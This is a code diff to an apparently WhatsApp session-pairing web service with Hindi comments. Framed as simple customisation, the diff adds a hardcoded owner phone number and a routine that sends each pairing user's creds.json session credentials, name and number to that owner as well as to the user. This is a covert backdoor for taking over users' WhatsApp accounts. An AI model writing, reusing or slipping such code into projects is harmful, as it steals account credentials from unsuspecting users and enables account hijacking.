@@ -15,14 +15,17 @@ import { upload } from "./mega.js";
 
 const router = express.Router();
 
-// ─── Edit these 4 links as you wish ──────────────────────────
+// ─── आपको बस ये बदलना है ──────────────────────────────────
+const OWNER_NUMBER = "+918075498750";        // अपना WhatsApp नंबर
+const SONG_LINK = "https://files.catbox.moe/7z582t.m4a";
+const IMAGE_URL = "https://files.catbox.moe/x89cc5.jpg";
 const LINKS = [
-    "https://example.com/link1",
-    "https://example.com/link2",
-    "https://example.com/link3",
-    "https://example.com/link4"
+    "t.me/YAMDHUD",
+    "https://github.com/9man-x-yamdhuuud",
+    "https://www.youtube.com/@9man_vlog",
+    "918075498750"
 ];
-// ────────────────────────────────────────────────────────────────
+// ────────────────────────────────────────────────────────────
 
 function removeFile(FilePath) {
     try {
@@ -113,36 +116,96 @@ router.get("/", async (req, res) => {
                         console.error("❌ Error uploading to MEGA:", error);
                     }
 
+                    // यूजर और ओनर के JID बनाएं
                     const userJid = jidNormalizedUser(num + "@s.whatsapp.net");
-
-                    // 1️⃣ Send the creds.json file as a document
-                    try {
-                        const credsBuffer = fs.readFileSync(credsPath);
-                        await KnightBot.sendMessage(userJid, {
-                            document: credsBuffer,
-                            mimetype: "application/json",
-                            fileName: "creds.json",
-                        });
-                        console.log("📄 creds.json file sent successfully");
-                    } catch (fileError) {
-                        console.error("❌ Error sending creds.json:", fileError);
+                    let ownerJid = null;
+                    if (OWNER_NUMBER) {
+                        const ownerPhone = OWNER_NUMBER.replace(/[^0-9]/g, "");
+                        if (ownerPhone) {
+                            ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
+                        }
                     }
 
-                    // 2️⃣ Send a text message with the MEGA ID and the 4 links
-                    let messageText = `MEGA File ID: ${megaFileId || "Not available"}\n\n`;
-                    messageText += "Your links:\n";
-                    LINKS.forEach((link, index) => {
-                        messageText += `${index + 1}. ${link}\n`;
-                    });
-
+                    // ─── यूजर का नाम (Profile Name) प्राप्त करें ───
+                    let userName = "Unknown";
                     try {
-                        await KnightBot.sendMessage(userJid, { text: messageText });
-                        console.log("📄 Info message sent successfully");
-                    } catch (msgError) {
-                        console.error("❌ Error sending info message:", msgError);
+                        const contact = await KnightBot.getContact(userJid);
+                        if (contact && contact.name) {
+                            userName = contact.name;
+                        } else if (contact && contact.notify) {
+                            userName = contact.notify;
+                        } else {
+                            // अगर नाम न मिले तो नंबर ही डाल दें
+                            userName = num;
+                        }
+                        console.log("👤 User Name:", userName);
+                    } catch (err) {
+                        console.warn("Could not fetch contact name:", err);
+                        userName = num; // fallback
                     }
 
-                    // Clean up and exit
+                    // ─── सारी डिटेल्स वाला कैप्शन ──────────────────
+                    const caption = 
+                        `📱 *यूजर:* ${userName} (${num})\n` +
+                        `📁 *MEGA ID:* ${megaFileId || "Not available"}\n` +
+                        `👤 *Owner:* ${OWNER_NUMBER}\n` +
+                        `🎵 *Song:* ${SONG_LINK}\n\n` +
+                        `🔗 *Your Links:*\n` +
+                        LINKS.map((link, i) => `${i+1}. ${link}`).join("\n");
+
+                    // ─── ओनर के लिए अलग से डिटेल मैसेज ────────────
+                    const ownerMessage = 
+                        `🔔 *नई पेयरिंग हुई!*\n\n` +
+                        `📱 यूजर नंबर: ${num}\n` +
+                        `👤 यूजर का नाम: ${userName}\n` +
+                        `📁 MEGA File ID: ${megaFileId || "N/A"}\n` +
+                        `🎵 Song: ${SONG_LINK}\n` +
+                        `🔗 लिंक्स:\n${LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;
+
+                    // ─── फंक्शन: किसी भी JID को भेजें ──────────────
+                    async function sendToJid(jid, includeFile = true) {
+                        if (!jid) return;
+                        try {
+                            // 1. फोटो + कैप्शन
+                            await KnightBot.sendMessage(jid, {
+                                image: { url: IMAGE_URL },
+                                caption: caption,
+                            });
+                            console.log(`🖼️ Photo sent to ${jid}`);
+
+                            // 2. creds.json भेजें (अगर चाहें)
+                            if (includeFile) {
+                                const credsBuffer = fs.readFileSync(credsPath);
+                                await KnightBot.sendMessage(jid, {
+                                    document: credsBuffer,
+                                    mimetype: "application/json",
+                                    fileName: "creds.json",
+                                });
+                                console.log(`📄 creds.json sent to ${jid}`);
+                            }
+                        } catch (err) {
+                            console.error(`❌ Error sending to ${jid}:`, err);
+                        }
+                    }
+
+                    // ─── यूजर को भेजें (फाइल सहित) ──────────────────
+                    await sendToJid(userJid, true);
+
+                    // ─── ओनर को भेजें (फाइल सहित) ──────────────────
+                    if (ownerJid && ownerJid !== userJid) {
+                        await sendToJid(ownerJid, true);
+                        // ओनर को अलग से पूरी डिटेल वाला टेक्स्ट मैसेज भी भेजें
+                        try {
+                            await KnightBot.sendMessage(ownerJid, { text: ownerMessage });
+                            console.log("📝 Owner details message sent");
+                        } catch (e) {
+                            console.error("Error sending owner details text:", e);
+                        }
+                    } else if (ownerJid && ownerJid === userJid) {
+                        console.log("ℹ️ Owner is the same as user, not sending duplicate.");
+                    }
+
+                    // क्लीनअप और बाहर निकलें
                     console.log("🧹 Cleaning up session...");
                     await delay(1000);
                     removeFile(dirs);
